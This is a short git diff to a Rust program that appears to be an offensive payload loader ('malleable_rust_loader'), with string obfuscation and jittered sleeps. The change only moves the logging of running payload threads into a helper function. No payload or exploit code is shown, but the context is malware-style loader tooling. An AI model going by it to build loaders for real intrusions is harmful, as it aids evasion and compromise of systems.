@@ -9,6 +9,7 @@ use_litcrypt!();
 use malleable_rust_loader::dataoperation::un_apply_all_dataoperations;
 use malleable_rust_loader::dataoperation::DataOperation;
 use malleable_rust_loader::payload::Payload;
+use malleable_rust_loader::payload_util::print_running_thread;
 
 use log::debug;
 use log::error;
@@ -84,16 +85,18 @@ fn main() {
             }
         }
 
+        print_running_thread(&mut running_thread);
         //print running_thread
-        if running_thread.len() != 0 {
-            info!("[+] RUNNING thread {}", running_thread.len());
-            for i in &running_thread {
-                info!("-thread: {:?}", i.1);
-            }
-        } else {
-            info!("[+] no RUNNING thread");
-        };
-
+        /*
+                if running_thread.len() != 0 {
+                    info!("[+] RUNNING thread {}", running_thread.len());
+                    for i in &running_thread {
+                        info!("-thread: {:?}", i.1);
+                    }
+                } else {
+                    info!("[+] no RUNNING thread");
+                };
+        */
         //TODO: param to wait for all running thread
         config.sleep_and_jitt();
         info!(
